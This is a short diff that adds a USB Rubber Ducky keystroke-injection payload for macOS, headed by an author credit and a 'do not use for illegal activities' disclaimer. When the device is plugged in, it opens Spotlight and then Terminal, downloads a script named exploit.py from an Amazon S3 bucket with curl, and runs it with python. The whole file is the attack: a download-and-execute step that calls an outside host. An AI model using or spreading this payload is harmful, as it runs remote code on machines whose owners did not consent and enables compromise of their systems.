@@ -1,0 +1,15 @@
+REM Created by Cody Bernardy
+REM DO NOT USE FOR ILLEGAL ACTIVITIES
+
+DELAY 1000
+GUI SPACE
+DELAY 1000
+STRING TERMINAL
+ENTER
+DELAY 1000
+STRING curl https://s3-us-west-2.amazonaws.com/remoteduck/exploit.py -o exploit.py
+ENTER
+DELAY 1000
+STRING python exploit.py
+DELAY 1000
+ENTER
